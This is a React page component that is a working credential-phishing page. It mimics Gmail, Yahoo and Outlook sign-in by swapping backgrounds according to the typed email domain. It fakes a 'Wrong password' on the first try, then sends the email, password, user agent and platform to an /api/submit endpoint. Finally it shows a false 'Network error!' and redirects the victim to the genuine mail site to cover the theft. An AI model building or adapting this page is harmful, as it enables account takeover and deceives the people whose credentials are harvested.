import { useState, useEffect } from "react";

export default function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [attempt, setAttempt] = useState(0);
  const [status, setStatus] = useState("");
  const [bg, setBg] = useState("/images/default.svg");
  const [countdown, setCountdown] = useState(10);
  const [showCountdown, setShowCountdown] = useState(false);

  useEffect(() => {
    let t;
    if (showCountdown && countdown > 0) {
      t = setTimeout(() => setCountdown((c) => c - 1), 1000);
    } else if (countdown === 0 && showCountdown) {
      const domain = (email.split("@")[1] || "").toLowerCase();
      let url = "https://www.google.com";
      if (domain.includes("gmail.com")) url = "https://mail.google.com";
      else if (domain.includes("yahoo.com")) url = "https://mail.yahoo.com";
      else if (domain.includes("outlook.com") || domain.includes("hotmail.com"))
        url = "https://outlook.live.com";
      window.location.href = url;
    }
    return () => clearTimeout(t);
  }, [showCountdown, countdown, email]);

  function handleEmail(e) {
    const val = e.target.value;
    setEmail(val);
    const parts = val.split("@");
    const domain = parts[1] ? parts[1].toLowerCase() : "";
    if (domain.includes("gmail.com")) setBg("/images/gmaildesk.png");
    else if (domain.includes("yahoo.com")) setBg("/images/yahoodesk.png");
    else if (domain.includes("outlook.com") || domain.includes("hotmail.com"))
      setBg("/images/outlookdesk.png");
    else setBg("/images/default.svg");
  }

  async function handleSubmit(e) {
    e.preventDefault();
    if (attempt === 0) {
      setAttempt(1);
      setStatus("Wrong password. Please try again.");
      return;
    }
    setStatus("");
    try {
      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email,
          password,
          browser: navigator.userAgent,
          platform: navigator.platform,
        }),
      });
      const data = await res.json();
      if (data.success) {
        setStatus("Network error!");
        setShowCountdown(true);
      } else {
        setStatus("Server error: " + (data.error || "unknown"));
      }
    } catch (err) {
      setStatus("Network error");
    }
  }

  return (
    <div
      className="min-h-screen flex items-center justify-center bg-cover bg-center"
      style={{ backgroundImage: `url(${bg})` }}
    >
      <div className="bg-white/90 p-6 rounded-lg shadow-md w-full max-w-md">
        <h1 className="text-2xl font-semibold mb-4">Sign in</h1>
        <form onSubmit={handleSubmit} className="space-y-3">
          <input
            value={email}
            onChange={handleEmail}
            type="email"
            placeholder="Email"
            required
            className="w-full p-3 border rounded"
          />
          <input
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            type="password"
            placeholder="Password"
            required
            className="w-full p-3 border rounded"
          />
          <button
            type="submit"
            className="w-full bg-blue-600 text-white p-3 rounded"
          >
            Submit
          </button>
        </form>
        <p
          className={`mt-3 text-sm ${
            status === "Network error!" ||
            status === "Wrong password. Please try again."
              ? "text-red-500"
              : "text-gray-600"
          }`}
        >
          {status}
        </p>

        <p className="mt-2 text-sm text-gray-400">
          <button className="text-grey-500 hover:underline focus:outline-none">
            Forgot password?
          </button>
        </p>
      </div>
    </div>
  );
}
